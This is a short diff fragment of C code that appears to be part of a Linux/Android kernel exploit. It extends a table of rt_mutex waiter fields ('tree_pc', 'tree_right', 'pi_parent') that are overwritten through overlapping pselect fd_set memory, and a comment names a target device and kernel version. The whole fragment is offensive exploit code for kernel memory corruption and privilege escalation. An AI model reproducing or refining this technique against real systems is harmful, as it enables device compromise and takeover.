@@ -365,6 +365,12 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                             : (uint64_t)INIT_TASK_OFF) + 0x878ULL);
       }
       struct pselect_waiter_word jc2_words[] = {
+          /* F9360 (SAME KMI) target.h: "5.10: waiter qword 0 overlaps the
+           * first fd-set qword" — at shift=0 ALL TEN words are stampable.
+           * tree {0,0,0} = root-case dequeue (deterministic, harmless);
+           * words 0/1 are NEVER left to the original linkage again. */
+          {0, 0, "tree_pc"},
+          {1, 0, "tree_right"},
           {2, 0, "tree_left"},
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
